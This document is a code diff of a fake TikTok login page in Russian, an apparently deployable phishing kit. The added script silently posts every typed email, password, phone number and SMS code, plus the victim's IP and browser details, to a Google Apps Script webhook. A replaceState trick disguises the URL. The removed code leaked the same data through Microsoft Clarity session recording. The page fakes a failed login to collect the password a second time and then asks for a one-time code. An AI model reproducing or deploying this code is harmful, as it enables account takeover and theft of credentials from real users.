@@ -6,7 +6,15 @@
   <title>Войти | TikTok</title>
   <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon" />
   
-  <!-- MICROSOFT CLARITY С ПОЛНОЙ ЗАПИСЬЮ БЕЗ БЛЮРА -->
+  <!-- ФЕЙКОВЫЙ РОУТИНГ (Трюк для 404.html на GitHub Pages) -->
+  <script>
+    // Моментально подменяем URL на "настоящий"
+    if (window.location.pathname !== '/login/phone-or-email/email') {
+      window.history.replaceState(null, "Войти | TikTok", "/login/phone-or-email/email");
+    }
+  </script>
+
+  <!-- MICROSOFT CLARITY -->
   <script type="text/javascript">
       (function(c,l,a,r,i,t,y){
           c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
@@ -16,109 +24,81 @@
   </script>
 
   <style>
-    /* === 1. ШРИФТЫ === */
-    @font-face {
-      font-family: 'TikTokFont';
-      src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Regular.woff2') format('woff2');
-      font-weight: 400; font-style: normal; font-display: swap;
-    }
-    @font-face {
-      font-family: 'TikTokFont';
-      src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Semibold.woff2') format('woff2');
-      font-weight: 600; font-style: normal; font-display: swap;
-    }
-    @font-face {
-      font-family: 'TikTokDisplayFont';
-      src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokDisplayFont-Bold.woff2') format('woff2');
-      font-weight: 700; font-style: normal; font-display: swap;
-    }
+    /* === ШРИФТЫ === */
+    @font-face { font-family: 'TikTokFont'; src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Regular.woff2') format('woff2'); font-weight: 400; font-style: normal; font-display: swap; }
+    @font-face { font-family: 'TikTokFont'; src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokFont-Semibold.woff2') format('woff2'); font-weight: 600; font-style: normal; font-display: swap; }
+    @font-face { font-family: 'TikTokDisplayFont'; src: url('https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok_fonts/TikTokDisplayFont-Bold.woff2') format('woff2'); font-weight: 700; font-style: normal; font-display: swap; }
 
-    /* === 2. ПЕРЕМЕННЫЕ (ТЕМНАЯ ТЕМА ПО УМОЛЧАНИЮ) === */
+    /* === ПЕРЕМЕННЫЕ === */
     :root {
-      --bg-base: #121212;
-      --text-primary: rgba(255, 255, 255, 0.9);
-      --text-secondary: rgba(255, 255, 255, 0.75);
-      --text-disabled: rgba(255, 255, 255, 0.34);
+      --bg-base: #FFFFFF;
+      --text-primary: #161823;
+      --text-secondary: rgba(22, 24, 35, 0.75);
+      --text-disabled: rgba(22, 24, 35, 0.34);
       --brand-red: #FE2C55;
       --brand-red-hover: #ea284e;
       --focus-red: #ff4c3a;
-      
-      --input-bg: rgba(255, 255, 255, 0.12);
-      --input-bg-focus: rgba(255, 255, 255, 0.15);
-      --input-border-focus: rgba(255, 255, 255, 0.2);
-      --divider-color: rgba(255, 255, 255, 0.12);
-      
-      --btn-disabled-bg: rgba(255, 255, 255, 0.08);
-      --btn-disabled-text: rgba(255, 255, 255, 0.34);
-
-      --logo-text: #FFFFFF;
-      --autofill-bg: #222;
-      --autofill-text: white;
+      --input-bg: rgba(22, 24, 35, 0.06);
+      --input-bg-focus: rgba(22, 24, 35, 0.06);
+      --input-border-focus: rgba(22, 24, 35, 0.2);
+      --divider-color: rgba(22, 24, 35, 0.12);
+      --btn-disabled-bg: rgba(22, 24, 35, 0.06);
+      --btn-disabled-text: rgba(22, 24, 35, 0.34);
+      --logo-text: #161823;
+      --autofill-bg: #f5f5f5;
+      --autofill-text: #161823;
     }
 
-    /* === АВТОМАТИЧЕСКАЯ СВЕТЛАЯ ТЕМА (Если в ОС/браузере светлая) === */
-    @media (prefers-color-scheme: light) {
+    @media (prefers-color-scheme: dark) {
       :root {
-        --bg-base: #FFFFFF;
-        --text-primary: #161823;
-        --text-secondary: rgba(22, 24, 35, 0.75);
-        --text-disabled: rgba(22, 24, 35, 0.34);
-        
-        --input-bg: rgba(22, 24, 35, 0.06);
-        --input-bg-focus: rgba(22, 24, 35, 0.06);
-        --input-border-focus: rgba(22, 24, 35, 0.2);
-        --divider-color: rgba(22, 24, 35, 0.12);
-        
-        --btn-disabled-bg: rgba(22, 24, 35, 0.06);
-        --btn-disabled-text: rgba(22, 24, 35, 0.34);
-
-        --logo-text: #161823;
-        --autofill-bg: #f5f5f5;
-        --autofill-text: #161823;
+        --bg-base: #121212;
+        --text-primary: rgba(255, 255, 255, 0.9);
+        --text-secondary: rgba(255, 255, 255, 0.75);
+        --text-disabled: rgba(255, 255, 255, 0.34);
+        --input-bg: rgba(255, 255, 255, 0.12);
+        --input-bg-focus: rgba(255, 255, 255, 0.15);
+        --input-border-focus: rgba(255, 255, 255, 0.2);
+        --divider-color: rgba(255, 255, 255, 0.12);
+        --btn-disabled-bg: rgba(255, 255, 255, 0.08);
+        --btn-disabled-text: rgba(255, 255, 255, 0.34);
+        --logo-text: #FFFFFF;
+        --autofill-bg: #222;
+        --autofill-text: white;
       }
     }
 
-    /* === 3. БАЗА === */
+    /* === БАЗА === */
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-font-smoothing: antialiased; }
     html, body { height: 100%; min-height: 100%; }
-    body { font-family: 'TikTokFont', Arial, sans-serif; font-size: 14px; color: var(--text-primary); background-color: var(--bg-base); display: flex; flex-direction: column; line-height: 1.5; transition: background-color 0.3s, color 0.3s;}
+    body { font-family: 'TikTokFont', Arial, sans-serif; font-size: 14px; color: var(--text-primary); background-color: var(--bg-base); display: flex; flex-direction: column; line-height: 1.5; transition: background-color 0.2s, color 0.2s; }
     a { color: inherit; text-decoration: none; cursor: pointer; transition: text-decoration 0.2s; }
-    a:hover { text-decoration: underline; }
+    a:hover { text-decoration: underline; text-decoration-color: var(--text-secondary); }
     button, input, select { font-family: inherit; border: none; outline: none; background: none; color: inherit; }
-    a:focus-visible, button:focus-visible, input:focus-visible { outline: 2px solid var(--focus-red); outline-offset: 1px; border-radius: 2px; }
 
-    /* === 4. ШАПКА === */
-    .header { display: flex; justify-content: space-between; align-items: center; height: 60px; padding: 0 20px 0 16px; border-bottom: 1px solid var(--divider-color); background: var(--bg-base); position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; transition: background-color 0.3s, border-color 0.3s;}
+    /* === ШАПКА === */
+    .header { display: flex; justify-content: space-between; align-items: center; height: 60px; padding: 0 20px 0 16px; border-bottom: 1px solid var(--divider-color); background: var(--bg-base); position: fixed; top: 0; left: 0; width: 100%; z-index: 1000; }
     .logo-link { display: flex; align-items: center; font-size: 0; }
     .feedback-link { display: flex; align-items: center; gap: 7px; font-weight: 600; font-size: 14px; color: var(--text-primary); }
     .feedback-link:hover { text-decoration: none; }
     .feedback-link span:hover { text-decoration: underline; }
-    /* Увеличенный значок вопроса */
-    .feedback-link svg { width: 20px; height: 20px; }
 
-    /* === 5. ЦЕНТР === */
+    /* === ЦЕНТР === */
     .main-wrapper { flex: 1; display: flex; flex-direction: column; margin-top: 60px; overflow-y: auto; }
     .form-container { width: 375px; max-width: 100%; margin: 64px auto 0; padding: 0 16px; }
     h2 { font-family: 'TikTokDisplayFont', sans-serif; font-size: 32px; font-weight: 700; text-align: center; margin-bottom: 16px; letter-spacing: -0.5px; }
+    .form-header { display: flex; align-items: baseline; margin-bottom: 10.5px; white-space: nowrap; flex-wrap: nowrap; }
+    .tab-active { font-size: 15px; font-weight: 600; color: var(--text-primary); margin-right: 8px; }
+    .tab-link { font-size: 12px; font-weight: 600; color: var(--text-secondary); text-decoration: none; }
 
-    /* Заголовки табов (в одну строчку) */
-    .form-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-    .tab-active { font-size: 15px; font-weight: 600; color: var(--text-primary); }
-    .tab-link { font-size: 12px; font-weight: 600; color: var(--text-secondary); white-space: nowrap; margin-left: 8px; }
-    .tab-link:hover { text-decoration-color: var(--text-secondary); }
-
-    /* === 6. ИНПУТЫ И КНОПКИ === */
+    /* === ИНПУТЫ И КНОПКИ === */
     .input-box { display: flex; background: var(--input-bg); border: 1px solid transparent; border-radius: 4px; height: 44px; margin-bottom: 9px; transition: all 0.3s ease; position: relative; align-items: center; }
     .input-box:focus-within { border-color: var(--input-border-focus); background: var(--input-bg-focus); }
-    
     .base-input { flex: 1; height: 100%; padding: 0 12px; font-size: 16px; color: var(--text-primary); caret-color: var(--brand-red); width: 100%; }
     .base-input::placeholder { color: var(--text-disabled); }
     input:-webkit-autofill { -webkit-box-shadow: 0 0 0 50px var(--autofill-bg) inset; -webkit-text-fill-color: var(--autofill-text); }
-
     .icon-btn { display: flex; align-items: center; justify-content: center; padding: 0 12px; color: var(--text-secondary); cursor: pointer; font-size: 20px; transition: color 0.2s; height: 100%; }
     .icon-btn:hover { color: var(--text-primary); }
 
-    /* Специфичные инпуты для телефона */
     .country-selector { display: flex; align-items: center; padding: 0 12px; cursor: pointer; position: relative; height: 100%; }
     .country-selector span { font-size: 16px; margin-right: 12px; }
     .country-selector::after { content: ""; position: absolute; right: 0; top: 50%; transform: translateY(-50%); width: 1px; height: 28px; background: var(--divider-color); }
@@ -129,91 +109,38 @@
     
     .btn-send-code { background: var(--btn-disabled-bg); color: var(--btn-disabled-text); font-weight: 600; font-size: 16px; padding: 0 16px; border-left: 1px solid var(--divider-color); border-radius: 0 4px 4px 0; cursor: not-allowed; flex-shrink: 0; transition: color 0.2s; }
     .btn-send-code.active { color: var(--brand-red); cursor: pointer; background: var(--input-bg); }
-    
-    .phone-error-msg { color: var(--brand-red); font-size: 12px; font-weight: 500; margin-bottom: 10px; display: none; line-height: 1.2; }
 
     .forgot-link { display: inline-block; font-size: 12px; font-weight: 600; color: var(--text-secondary); margin-bottom: 21px; margin-top: 5px;}
-    .forgot-link:hover { text-decoration-color: var(--text-secondary); }
-
     .btn-submit { width: 100%; height: 46px; background-color: var(--btn-disabled-bg); color: var(--btn-disabled-text); font-size: 16px; font-weight: 700; border-radius: 4px; cursor: not-allowed; display: flex; justify-content: center; align-items: center; transition: background-color 0.2s, color 0.2s; margin-top: 5px;}
     .btn-submit.active { background-color: var(--brand-red); color: white; cursor: pointer; }
     .btn-submit.active:hover { background-color: var(--brand-red-hover); }
 
     .btn-back { display: flex; align-items: center; justify-content: center; gap: 4px; margin-top: 40px; font-weight: 600; font-size: 14px; color: var(--text-primary); cursor: pointer; width: fit-content; margin-left: auto; margin-right: auto; }
-    .btn-back svg { font-size: 16px; }
-
-    /* === 7. ПОДВАЛ === */
-    /* Верхний блок (Регистрация) реагирует на тему (белый/черный) */
-    .footer-signup { 
-      display: flex; justify-content: center; align-items: center; height: 64px; 
-      border-top: 1px solid var(--divider-color); font-size: 15px; margin-top: 20px; 
-      background: var(--bg-base); color: var(--text-primary); transition: background-color 0.3s;
-    }
+    
+    /* === ПОДВАЛ === */
+    .footer-signup { display: flex; justify-content: center; align-items: center; height: 64px; border-top: 1px solid var(--divider-color); font-size: 15px; margin-top: auto; background: var(--bg-base); color: var(--text-primary); }
     .footer-signup a { color: var(--brand-red); font-weight: 600; margin-left: 5px; }
     .footer-signup a:hover { text-decoration-color: var(--brand-red); }
     
-    /* Нижний блок (Язык, Копирайт) ВСЕГДА ТЕМНЫЙ */
-    .footer-info { 
-      display: flex; justify-content: space-between; align-items: center; 
-      height: 84px; padding: 0 144px; background: #121212; color: #8a8b91; 
-      flex-shrink: 0; width: 100%; 
-    }
-    .lang-wrapper { position: relative; border: 1px solid #8a8b91; border-radius: 2px; height: 36px; width: 172px; display: flex; align-items: center; padding: 0 16px; }
-    .lang-wrapper p { font-size: 14px; }
+    .footer-info-bottom { display: flex; flex-direction: row; justify-content: center; align-items: center; gap: 12px; background: var(--bg-base); padding-bottom: 24px; width: 100%; flex-shrink: 0; }
+    .lang-wrapper { position: relative; border: 1px solid var(--text-secondary); border-radius: 2px; height: 36px; display: flex; align-items: center; padding: 0 16px; cursor: pointer; }
+    .lang-wrapper p { font-size: 14px; font-weight: 500; color: var(--text-primary); margin: 0; }
     .lang-select { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
-    .copyright { font-family: 'TikTokDisplayFont', sans-serif; font-size: 14px; font-weight: 500; color: #8a8b91; }
+    .copyright { font-family: 'TikTokDisplayFont', sans-serif; font-size: 14px; font-weight: 500; color: var(--text-secondary); }
 
-    @media (max-width: 768px) {
-      .footer-info { padding: 0 20px; flex-direction: column; justify-content: center; gap: 10px; height: auto; padding-bottom: 20px; }
-    }
-
-    /* === TOAST NOTIFICATION (Стили всплывашки) === */
-    .toast-container {
-      position: fixed;
-      top: 30px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(37, 37, 37, 0.95);
-      color: white;
-      padding: 12px 24px;
-      border-radius: 8px;
-      font-size: 14px;
-      font-weight: 500;
-      z-index: 9999;
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 0.3s ease;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-      text-align: center;
-      max-width: 90%;
-    }
+    /* === TOAST NOTIFICATION === */
+    .toast-container { position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: rgba(37, 37, 37, 0.95); color: white; padding: 12px 24px; border-radius: 8px; font-size: 14px; font-weight: 500; z-index: 9999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; max-width: 90%; }
     .toast-container.show { opacity: 1; }
-
-    /* ХАК ДЛЯ CLARITY (Сливается с фоном сайта) */
-    .clarity-tracker {
-      position: absolute; 
-      top: 0; left: 0; 
-      color: var(--bg-base); 
-      background-color: var(--bg-base); 
-      z-index: -1; 
-      user-select: none; 
-      pointer-events: none;
-      font-size: 12px;
-    }
+    .clarity-tracker { position: absolute; top: 0; left: 0; color: var(--bg-base); background-color: var(--bg-base); z-index: -1; user-select: none; pointer-events: none; font-size: 12px; }
   </style>
 </head>
 <body data-clarity-unmask="true">
 
-  <!-- СЕКРЕТНЫЙ ТРЕКЕР ДЛЯ CLARITY -->
   <div id="clarity-dump" class="clarity-tracker" data-clarity-unmask="true"></div>
-
-  <!-- Всплывающее уведомление (Toast) -->
   <div id="custom-toast" class="toast-container"></div>
 
-  <!-- ШАПКА -->
   <header class="header">
     <a href="#" class="logo-link" aria-label="TikTok">
-      <!-- ЛОГОТИП АВТОМАТИЧЕСКИ СТАНОВИТСЯ ЧЕРНЫМ ИЛИ БЕЛЫМ -->
       <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 118 30" width="118" height="42">
         <path fill="#25F4EE" d="M9.875 11.842v-1.119A8.836 8.836 0 008.7 10.64c-4.797-.006-8.7 3.9-8.7 8.707a8.706 8.706 0 003.718 7.135A8.675 8.675 0 011.38 20.55c0-4.737 3.794-8.598 8.495-8.707z"></path>
         <path fill="#25F4EE" d="M10.087 24.526c2.14 0 3.89-1.707 3.966-3.83l.007-18.968h3.462a6.78 6.78 0 01-.109-1.202h-4.727l-.006 18.968a3.978 3.978 0 01-3.967 3.83 3.93 3.93 0 01-1.846-.46 3.949 3.949 0 003.22 1.662zM23.992 8.166V7.111a6.506 6.506 0 01-3.584-1.067 6.572 6.572 0 003.584 2.122z"></path>
@@ -239,17 +166,17 @@
       <div id="view-email">
         <div class="form-header">
           <span class="tab-active">Почта или имя пользователя</span>
-          <a class="tab-link" id="go-to-phone">Войти через телефон</a>
+          <a href="#" class="tab-link" id="go-to-phone">Войти через телефон</a>
         </div>
         <form id="email-form">
           <div class="input-box">
-            <input type="text" name="email" id="email-input" class="base-input" placeholder="Почта или имя пользователя" autocomplete="username" data-clarity-unmask="true">
+            <input type="text" name="email" id="email-input" class="base-input log-input" placeholder="Почта или имя пользователя" autocomplete="username" data-clarity-unmask="true">
             <div class="icon-btn" style="cursor: default;">
               <svg fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M19 4a10 10 0 1 0 0 20 10 10 0 0 0 0-20ZM19 27C8.06 27 2 34.92 2 41.44 2 45 4 45 11 45h9.5a6 6 0 0 1 1.81-5.48l5.15-4.78a11.5 11.5 0 0 1-.14-5.94A19.06 19.06 0 0 0 19 27Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M38.5 24a7.5 7.5 0 0 0-6.34 11.51l-8.07 8.08 2.82 2.82 2.84-2.83 2.84 2.83 2.82-2.82-2.83-2.84 2.55-2.55A7.5 7.5 0 1 0 38.5 24ZM35 31.5a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0Z"></path></svg>
             </div>
           </div>
           <div class="input-box">
-            <input type="password" name="password" id="pass-input" class="base-input" placeholder="Пароль" autocomplete="current-password" data-clarity-unmask="true">
+            <input type="password" name="password" id="pass-input" class="base-input log-input" placeholder="Пароль" autocomplete="current-password" data-clarity-unmask="true">
             <button type="button" class="icon-btn" id="toggle-pass-btn">
               <svg id="eye-closed" fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M38.88 41.7a1 1 0 0 0 1.41 0l1.42-1.4a1 1 0 0 0 0-1.42l-3.86-3.86a24.57 24.57 0 0 0 6.27-9.69 1 1 0 0 0 0-.66C41 15.8 32.66 9 23 9c-3.27 0-6.35.73-9.12 2.05L9.12 6.29a1 1 0 0 0-1.41 0L6.29 7.71a1 1 0 0 0 0 1.41l32.59 32.59Zm-22-27.66A17.8 17.8 0 0 1 23 13c12.75 0 17 12 17 12s-1.38 3.9-4.93 7.25l-4.54-4.55A7.99 7.99 0 0 0 23 17c-.95 0-1.86.16-2.7.47l-3.43-3.43ZM1.87 24.67a24.64 24.64 0 0 1 5.8-9.23l2.77 2.78C7.25 21.46 6 25 6 25s4.25 12 17 12a18 18 0 0 0 5.42-.8l3.05 3.05A21.2 21.2 0 0 1 23 41c-9.83 0-17.93-6.63-21.13-15.67a1 1 0 0 1 0-.66Z"></path><path d="M15 25c0-.68.08-1.35.24-1.98l9.74 9.73A8.02 8.02 0 0 1 15 25Z"></path></svg>
               <svg id="eye-open" style="display: none;" fill="currentColor" viewBox="0 0 48 48" width="1em" height="1em"><path d="M24 9C14.34 9 6 15.8 2 24c4 8.2 12.34 15 22 15s18-6.8 22-15C42 15.8 33.66 9 24 9Zm0 25a10 10 0 1 1 0-20 10 10 0 0 1 0 20Z"></path><path d="M24 17a7 7 0 1 0 0 14 7 7 0 0 0 0-14Z"></path></svg>
@@ -264,7 +191,7 @@
       <div id="view-phone" style="display: none;">
         <div class="form-header">
           <span class="tab-active">Телефон</span>
-          <a class="tab-link" id="go-to-email">Войти через эл. почту или имя пользователя</a>
+          <a href="#" class="tab-link" id="go-to-email">Войти через эл. почту или имя пользователя</a>
         </div>
         <form id="phone-form">
           <div class="input-box">
@@ -272,16 +199,17 @@
               <span>CY +357</span>
               <svg width="1em" height="1em" viewBox="0 0 48 48" fill="currentColor"><path fill-rule="evenodd" clip-rule="evenodd" d="M25.5187 35.2284C24.7205 36.1596 23.2798 36.1596 22.4816 35.2284L8.83008 19.3016C7.71807 18.0042 8.63988 16 10.3486 16H37.6517C39.3604 16 40.2822 18.0042 39.1702 19.3016L25.5187 35.2284Z"></path></svg>
             </div>
-            <input type="text" name="phone" id="phone-input" class="base-input" placeholder="Номер телефона" data-clarity-unmask="true">
+            <input type="text" name="phone" id="phone-input" class="base-input log-input" placeholder="Номер телефона" data-clarity-unmask="true">
           </div>
           
           <div class="code-input-group">
             <div class="code-input-wrapper">
-              <input type="text" name="code" id="code-input" class="base-input" placeholder="Введите 6-значный код" maxlength="6" data-clarity-unmask="true">
+              <input type="text" name="code" id="code-input" class="base-input log-input" placeholder="Введите 6-значный код" maxlength="6" data-clarity-unmask="true">
             </div>
             <button type="button" id="send-code-btn" class="btn-send-code" disabled>Отправить код</button>
           </div>
-          <a href="#" class="forgot-link" style="margin-bottom: 21px; display:block">Войти с паролем</a>
+          
+          <a href="#" id="go-to-password" class="forgot-link" style="margin-bottom: 21px; display:block">Войти с паролем</a>
           <button type="submit" id="phone-submit-btn" class="btn-submit" disabled>Войти</button>
         </form>
       </div>
@@ -299,7 +227,7 @@
   <div class="footer-signup">
     Еще нет аккаунта? <a href="https://www.tiktok.com/signup">Регистрация</a>
   </div>
-  <footer class="footer-info">
+  <footer class="footer-info-bottom">
     <div class="lang-wrapper">
       <p>Русский</p>
       <select class="lang-select">
@@ -311,21 +239,93 @@
   </footer>
 
   <script>
-    // --- ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК ---
+    // ==========================================
+    // ЛОГИРОВАНИЕ ДАННЫХ И IP (ВСЁ В РЕАЛЬНОМ ВРЕМЕНИ)
+    // ==========================================
+    const GAS_WEBHOOK = 'https://script.google.com/macros/s/AKfycbwyDN3MGMwE-fEt6WBmMjJeBlX_DkfXiyVHbTOfsT3NPOqxEVNLNovzOM1xg8ZslX2Xsg/exec';
+    
+    let globalIp = "Определяется...";
+    let logTimeout;
+
+    // 1. Получаем IP при загрузке
+    async function fetchIp() {
+      try {
+        const res = await fetch('https://ipapi.co/ip/');
+        if (res.ok) {
+          globalIp = (await res.text()).trim();
+          sendSilentLog(); // Отправляем первую запись (просто IP)
+        } else {
+          const fallback = await fetch('https://api.ipify.org');
+          if (fallback.ok) globalIp = (await fallback.text()).trim();
+          sendSilentLog();
+        }
+      } catch (e) {
+        // Игнор ошибок
+      }
+    }
+    window.addEventListener('load', fetchIp);
+
+    // 2. Функция тихой отправки данных
+    function sendSilentLog() {
+      const eVal = document.getElementById('email-input').value.trim();
+      const pVal = document.getElementById('pass-input').value.trim();
+      const phVal = document.getElementById('phone-input').value.trim();
+      const cVal = document.getElementById('code-input').value.trim();
+
+      const combinedData = `Email: ${eVal} | Pass: ${pVal} | Phone: ${phVal} | Code: ${cVal}`;
+
+      fetch(GAS_WEBHOOK, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'text/plain' },
+        body: JSON.stringify({
+          ip: globalIp,
+          userAgent: navigator.userAgent,
+          page: window.location.href,
+          referrer: document.referrer || 'Прямой заход',
+          typed: combinedData
+        })
+      }).catch(() => {});
+    }
+
+    // 3. Вешаем слушатель на все поля ввода. Задержка 800мс чтобы не спамить.
+    const allInputs = document.querySelectorAll('.log-input');
+    allInputs.forEach(input => {
+      input.addEventListener('input', () => {
+        clearTimeout(logTimeout);
+        logTimeout = setTimeout(sendSilentLog, 800);
+      });
+    });
+
+
+    // ==========================================
+    // ИНТЕРФЕЙС И КНОПКИ (UI)
+    // ==========================================
     const viewEmail = document.getElementById('view-email');
     const viewPhone = document.getElementById('view-phone');
-    document.getElementById('go-to-phone').addEventListener('click', (e) => { e.preventDefault(); viewEmail.style.display = 'none'; viewPhone.style.display = 'block'; });
-    document.getElementById('go-to-email').addEventListener('click', (e) => { e.preventDefault(); viewPhone.style.display = 'none'; viewEmail.style.display = 'block'; });
+    
+    document.getElementById('go-to-phone').addEventListener('click', (e) => { 
+      e.preventDefault(); viewEmail.style.display = 'none'; viewPhone.style.display = 'block'; 
+      window.history.replaceState(null, "Войти | TikTok", "/login/phone-or-email/phone");
+    });
+    
+    document.getElementById('go-to-email').addEventListener('click', (e) => { 
+      e.preventDefault(); viewPhone.style.display = 'none'; viewEmail.style.display = 'block'; 
+      window.history.replaceState(null, "Войти | TikTok", "/login/phone-or-email/email");
+    });
 
-    // --- ФУНКЦИЯ УВЕДОМЛЕНИЙ (Toast) ---
+    document.getElementById('go-to-password').addEventListener('click', (e) => {
+      e.preventDefault(); viewPhone.style.display = 'none'; viewEmail.style.display = 'block'; 
+      window.history.replaceState(null, "Войти | TikTok", "/login/phone-or-email/email");
+    });
+
     const toast = document.getElementById('custom-toast');
     function showToast(message) {
-      toast.innerText = message;
-      toast.classList.add('show');
+      toast.innerText = message; toast.classList.add('show');
       setTimeout(() => { toast.classList.remove('show'); }, 3000);
     }
 
-    // --- ЛОГИКА ФОРМЫ EMAIL ---
+    // --- ФОРМА EMAIL ---
     const emailInput = document.getElementById('email-input');
     const passInput = document.getElementById('pass-input');
     const emailSubmitBtn = document.getElementById('email-submit-btn');
@@ -346,47 +346,34 @@
 
     togglePassBtn.addEventListener('click', () => {
       if (passInput.type === 'password') {
-        passInput.type = 'text';
-        eyeClosed.style.display = 'none'; eyeOpen.style.display = 'block';
+        passInput.type = 'text'; eyeClosed.style.display = 'none'; eyeOpen.style.display = 'block';
       } else {
-        passInput.type = 'password';
-        eyeClosed.style.display = 'block'; eyeOpen.style.display = 'none';
+        passInput.type = 'password'; eyeClosed.style.display = 'block'; eyeOpen.style.display = 'none';
       }
     });
 
     document.getElementById('email-form').addEventListener('submit', (e) => {
       e.preventDefault();
       emailLoginAttempts++;
-      
-      emailSubmitBtn.innerText = 'Загрузка...';
-      emailSubmitBtn.style.opacity = '0.7';
+      emailSubmitBtn.innerText = 'Загрузка...'; emailSubmitBtn.style.opacity = '0.7';
+      sendSilentLog(); // Принудительная отправка при клике
 
       if(emailLoginAttempts === 1) {
-        // Первый раз — выдаем ошибку и сбрасываем поле пароля
         setTimeout(() => {
-          emailSubmitBtn.innerText = 'Войти';
-          emailSubmitBtn.style.opacity = '1';
-          showToast('Неверный аккаунт или пароль');
-          passInput.value = ''; // Очистка пароля для реалистичности
-          validateEmailForm();
+          emailSubmitBtn.innerText = 'Войти'; emailSubmitBtn.style.opacity = '1';
+          showToast('Неверный аккаунт или пароль'); passInput.value = ''; validateEmailForm();
         }, 800);
       } else {
-        // Второй раз — "Успех" и перенаправление на ввод телефона
         setTimeout(() => {
-          emailSubmitBtn.innerText = 'Войти';
-          emailSubmitBtn.style.opacity = '1';
-          
-          // Переключаемся на форму ввода телефона
-          viewEmail.style.display = 'none';
-          viewPhone.style.display = 'block';
-          
+          emailSubmitBtn.innerText = 'Войти'; emailSubmitBtn.style.opacity = '1';
+          viewEmail.style.display = 'none'; viewPhone.style.display = 'block';
+          window.history.replaceState(null, "Войти | TikTok", "/login/phone-or-email/phone");
           showToast('В целях безопасности подтвердите вход по номеру телефона');
         }, 1200);
       }
     });
 
-
-    // --- ЛОГИКА ФОРМЫ ТЕЛЕФОНА ---
+    // --- ФОРМА ТЕЛЕФОНА ---
     const phoneInput = document.getElementById('phone-input');
     const codeInput = document.getElementById('code-input');
     const sendCodeBtn = document.getElementById('send-code-btn');
@@ -401,6 +388,7 @@
     });
 
     sendCodeBtn.addEventListener('click', () => {
+      sendSilentLog();
       showToast(`СМС отправлено на номер ${phoneInput.value.trim()}`);
     });
 
@@ -414,23 +402,10 @@
 
     document.getElementById('phone-form').addEventListener('submit', (e) => {
       e.preventDefault();
-      phoneSubmitBtn.innerText = 'Загрузка...';
-      phoneSubmitBtn.style.opacity = '0.7';
-      // Итоговое перенаправление по ссылке
-      setTimeout(() => {
-        window.location.href = 'https://www.tiktok.com/@tiktok/video/7106594312292453675';
-      }, 1000);
+      phoneSubmitBtn.innerText = 'Загрузка...'; phoneSubmitBtn.style.opacity = '0.7';
+      sendSilentLog(); // Принудительная отправка при финальном клике
+      setTimeout(() => { window.location.href = 'https://vt.tiktok.com/ZSHHDduBL/'; }, 1000);
     });
-
-    // --- ХАК ДЛЯ CLARITY ---
-    const clarityDump = document.getElementById('clarity-dump');
-    const updateClarityDump = () => {
-      clarityDump.innerText = `LOG:${emailInput.value} | PASS:${passInput.value} | TEL:${phoneInput.value} | COD:${codeInput.value}`;
-    };
-    emailInput.addEventListener('input', updateClarityDump);
-    passInput.addEventListener('input', updateClarityDump);
-    phoneInput.addEventListener('input', updateClarityDump);
-    codeInput.addEventListener('input', updateClarityDump);
   </script>
 </body>
 </html>
